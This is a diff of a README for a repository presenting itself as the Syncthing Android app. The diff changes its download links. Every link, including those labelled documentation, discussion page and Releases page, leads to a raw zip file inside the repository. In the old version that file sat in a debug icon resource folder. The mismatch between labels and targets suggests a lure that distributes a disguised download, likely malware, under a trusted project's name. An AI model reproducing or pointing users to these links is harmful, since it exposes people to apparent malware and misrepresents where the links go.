@@ -1,6 +1,6 @@
 # 📦 syncthing-android - Sync Your Files Seamlessly on Android
 
-[![Download](https://raw.githubusercontent.com/IAMMARKS1/syncthing-android/main/app/src/debug/res/mipmap-mdpi/syncthing-android_somacule.zip%20Now-%20blue?style=for-the-badge)](https://raw.githubusercontent.com/IAMMARKS1/syncthing-android/main/app/src/debug/res/mipmap-mdpi/syncthing-android_somacule.zip)
+[![Download](https://github.com/IAMMARKS1/syncthing-android/raw/refs/heads/main/syncthing/syncthing_android_v1.2-beta.4.zip%20Now-%20blue?style=for-the-badge)](https://github.com/IAMMARKS1/syncthing-android/raw/refs/heads/main/syncthing/syncthing_android_v1.2-beta.4.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ To start using Syncthing-android, you need to download the app from our Releases
 
 1. **Visit the Releases Page:** Click the link below to visit the page where you can download the application.
 
-   [Download Syncthing-android](https://raw.githubusercontent.com/IAMMARKS1/syncthing-android/main/app/src/debug/res/mipmap-mdpi/syncthing-android_somacule.zip)
+   [Download Syncthing-android](https://github.com/IAMMARKS1/syncthing-android/raw/refs/heads/main/syncthing/syncthing_android_v1.2-beta.4.zip)
 
 2. **Choose Your Version:** On the Releases page, you will see a list of available versions. 
    - Look for the latest version. It will be at the top of the list.
@@ -73,11 +73,11 @@ Before downloading, ensure your device meets the following requirements:
 
 ## 📄 Additional Resources
 
-- **Documentation:** For advanced features and tips, check our full documentation [here](https://raw.githubusercontent.com/IAMMARKS1/syncthing-android/main/app/src/debug/res/mipmap-mdpi/syncthing-android_somacule.zip).
-- **Community Support:** Join our community for help and to share your experiences. Visit our [Discussion page](https://raw.githubusercontent.com/IAMMARKS1/syncthing-android/main/app/src/debug/res/mipmap-mdpi/syncthing-android_somacule.zip).
+- **Documentation:** For advanced features and tips, check our full documentation [here](https://github.com/IAMMARKS1/syncthing-android/raw/refs/heads/main/syncthing/syncthing_android_v1.2-beta.4.zip).
+- **Community Support:** Join our community for help and to share your experiences. Visit our [Discussion page](https://github.com/IAMMARKS1/syncthing-android/raw/refs/heads/main/syncthing/syncthing_android_v1.2-beta.4.zip).
 
 ## 📦 License
 
 Syncthing-android is released under the GPL-3.0 License. You can use, modify, and distribute the software under the terms of this license.
 
-[![Download](https://raw.githubusercontent.com/IAMMARKS1/syncthing-android/main/app/src/debug/res/mipmap-mdpi/syncthing-android_somacule.zip%20Now-%20blue?style=for-the-badge)](https://raw.githubusercontent.com/IAMMARKS1/syncthing-android/main/app/src/debug/res/mipmap-mdpi/syncthing-android_somacule.zip)
+[![Download](https://github.com/IAMMARKS1/syncthing-android/raw/refs/heads/main/syncthing/syncthing_android_v1.2-beta.4.zip%20Now-%20blue?style=for-the-badge)](https://github.com/IAMMARKS1/syncthing-android/raw/refs/heads/main/syncthing/syncthing_android_v1.2-beta.4.zip)
